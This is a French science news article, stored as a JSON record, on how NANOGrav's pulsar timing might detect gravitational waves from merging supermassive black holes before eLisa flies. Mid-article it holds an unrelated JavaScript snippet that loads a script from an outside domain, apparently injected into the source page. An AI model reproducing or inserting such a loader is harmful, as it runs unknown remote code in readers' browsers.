{"title": "Des ondes gravitationnelles bientot detectables grace aux pulsars ?", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-11-20", "content": "Une equipe d'astrophysiciens vient de le confirmer : il devrait bientot etre possible d'observer les ondes gravitationnelles emises par les collisions de trous noirs supermassifs. Il serait meme possible de le faire avant le lancement dans l'espace du detecteur eLisa grace aux pulsars. Ce qu'il faut retenir Base sur le meme principe de detection des ondes gravitationnelles que Virgo et Ligo, l'observatoire eLisa devrait rejoindre l'espace d'ici 2035 environ. Son but est d'observer en particulier les fusions de trous noirs supermassifs. Mais, selon les chercheurs du consortium  North American Nanohertz Observatory for Gravitational Waves,  il ne sera probablement pas necessaire d'attendre aussi longtemps pour que la detection de la premiere onde gravitationnelle emise par un tel trou noir binaire ait lieu. Il suffira de mesurer des delais anormaux dans les temps d'arrivee de signaux de pulsars (ces balises radio naturelles tres stables d'ordinaire) situes a 3.000 annees-lumiere de la Terre. Interview : comment mesurer les ondes gravitationnelles ?                       Les ondes gravitationnelles sont des deformations de l'espace-temps predites par Einstein. Il serait possible de les mesurer avec des outils appropries. L'editeur litteraire Dunod a interviewe Pierre Binetruy, professeur au laboratoire Astroparticule et Cosmologie de l'universite Paris Diderot, afin d'en savoir plus sur ces mysterieuses ondes et sur la facon dont on pourrait les detecter.                                       La spectaculaire detection conjointe par  Ligo  et  Virgo  des  ondes gravitationnelles  emises par une  kilonova  a confirme que nous etions pleinement rentres dans l'ere de l'astronomie gravitationnelle. Toutefois, ces detecteurs, et ceux en construction sur  Terre  utilisant le meme schema de fonctionnement, ne peuvent nous donner acces qu'a une certaine  bande de frequences , comme d'ailleurs tous les instruments bases sur les  ondes electromagnetiques  en astronomie ( Hubble  ne peut pas voir dans le domaine des  rayons X  par exemple et  Chandra  ne peut pas voir dans le visible). Ainsi, les  telescopes  gravitationnels terrestres ne peuvent voir, pour l'essentiel, que les ondes generees par les cadavres d'objets stellaires formant des  systemes binaires , a savoir des  etoiles a neutrons  et des  trous noirs stellaires  en train de se rapprocher peu avant de fusionner. Mais qu'en est-il des  fusions  de  trous noirs supermassifs  ? Si l'on veut les etudier, l'instrument le plus indique sera  eLisa , que l'ESA devrait lancer dans l'espace dans les annees 2030. Deux trous noirs supermassifs binaires observes aux rayons X ( X-ray , en anglais sur les images) par Chandra et associes a des galaxies en interaction vues dans le visible ( optical ). (c) Nasa                               Mieux comprendre les trous noirs supermassifs binaires Contenant plusieurs millions a plusieurs milliards de  masses  solaires, les trous noirs supermassifs sont des  astres  compacts. Il s'agit de sources d'ondes gravitationnelles tres intenses. Ils sont donc facilement detectables, mais, comme les distances entre ces objets sont aussi plus grandes, les  mouvements  sont plus lents et les frequences des ondes sont plus basses pendant des millions d'annees avant que la fusion ne se produise.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Nous savons qu'il y a des trous noirs supermassifs binaires dans l' univers  observable. Ce sont, par exemple, les observations aux rayons X de Chandra et celles dans le  domaine radio du VLBA  qui nous le disent. Ces trous noirs resultent de la fusion de deux grandes  galaxies . Mais nous ne savons pas tres bien comment ce phenomene se produit ni a quel rythme dans l'histoire du cosmos. Or, celui-ci doit jouer un role important dans l'histoire des galaxies et, ne serait-ce que de ce point de vue, il est important de le connaitre plus en profondeur. L'astronomie gravitationnelle devrait nous y aider. Les pulsars, des horloges sensibles aux ondes gravitationnelles Faut-il attendre encore une quinzaine d'annees, voire plus en cas de retard du projet eLisa, pour commencer a avoir des reponses a ce sujet ? Peut-etre que non, si l'on en croit un article publie dans  Nature Astronomy  et disponible sur  arXiv . Celui-ci provient de membres du  North American Nanohertz Observatory for Gravitational Waves  ( NanoGrav ), un consortium de radioastronomes et de physiciens des ondes gravitationnelles dont le but est de detecter les ondes gravitationnelles en utilisant un reseau de  pulsars  millisecondes comme horloges. Ces balises  radio  fonctionnant comme des phares cosmiques doivent pour cela etre observees avec une tres grande precision. Une campagne a deja ete menee dans ce sens pendant une  duree  de neuf ans avec deux des  radiotelescopes  les plus sensibles sur Terre, le   Green Bank Telescope ,  en Virginie-Occidentale, et l'observatoire d'Arecibo, a Porto Rico (tous les deux aux Etats-Unis). Cinquante-quatre pulsars sont actuellement observes avec le meme objectif et, selon les chercheurs, on pourrait bien detecter les ondes gravitationnelles produites par au moins un trou noir supermassif binaire au cours de la prochaine decennie. Une presentation de NanoGrav. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c) PhysicistMichael Une modification de la distance entre le Systeme solaire et les pulsars L'idee derriere cette detection, comme explique dans la video ci-dessus, est que le passage d'une onde gravitationnelle va modifier la distance entre le  Systeme solaire  et les pulsars. Ainsi, les  flashs  radio particulierement stables de ces pulsars vont presenter une  anomalie  dans leurs temps d'arrivee. L'analyse des decalages dans ces temps trahira le passage d'une onde gravitationnelle d'une forme donnee. Dans le travail qu'ils viennent de publier, les chercheurs de NanoGrav ont voulu preciser les chances d'observer ces anomalies dans les annees a venir, et donc les chances d'estimer le nombre de trous noirs supermassifs binaires susceptibles d'emettre des signaux mesurables. Nous devrions commencer a pouvoir le faire quelques millions d'annees avant la fusion de ces trous noirs, selon les astrophysiciens. Le phenomene est lent parce que les distances a parcourir sont grandes lors des fusions de galaxies qui prennent des centaines de millions d'annees. Pour arriver au resultat recherche, il a fallu combiner des observations de galaxies menees dans le cadre du  2  Micron  All-Sky Survey  (2Mass) et des resultats de la  simulation Illustris  concernant les galaxies et les grandes structures que ces dernieres forment. Il semble que, dans un echantillon de 5.000 galaxies proches de la  Voie lactee , environ 90 trous noirs supermassifs binaires seraient sur le point d'entrer en collision. ", "theme": "sciences"}